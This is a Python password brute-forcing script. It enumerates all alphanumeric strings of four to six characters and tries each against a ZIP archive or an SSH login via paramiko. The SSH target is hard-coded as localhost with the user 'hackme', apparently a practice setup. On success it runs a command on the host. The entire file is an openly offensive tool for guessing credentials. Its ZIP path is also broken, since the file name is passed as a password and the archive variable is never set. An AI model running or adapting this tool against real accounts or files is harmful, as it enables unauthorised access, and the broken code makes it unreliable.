import string
import itertools
from zipfile import ZipFile
import paramiko

def password_gen(bf_object):
    ascii_chars = string.ascii_letters + string.digits # + string.punctuation
    for password_len in range(4,7):
        options = itertools.product(ascii_chars, repeat=password_len)
        for password in options:
            if bf_object == "zip":
                zip_bf("".join(password))
            elif bf_object == "ssh":
               ssh_bf("".join(password))


def zip_bf(password):
    try:
        with ZipFile(zip_file) as zf:
            zf.extractall(pwd=bytes("".join(password),'utf-8'))
            print(password)
            exit()
    except RuntimeError:
      print(f"wrong password: {password}",end="\r")
    except Exception:
        return

def ssh_bf(password):
   command = "uname"
   host = "127.0.0.1"
   username="hackme"
   client = paramiko.client.SSHClient()
   client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
   try:
    client.connect(host, username=username, password=password)
   except paramiko.ssh_exception.AuthenticationException:
      print(f"wrong password: {password}",end="\r")
      return
   except paramiko.ssh_exception.SSHException:
      return
   _stdin, _stdout, _stderr = client.exec_command(command)
   print(_stdout.read().decode())
   client.close()
   print(password)
   exit()


def main():
    option = input("1 for zip\n2 for ssh\nchoose wisely: ")
    
    if option == "1":
        global zip_file
        zip_bf(input("zip file please"))
        password_gen("zip")
    if  option== "2":
        password_gen("ssh")

main()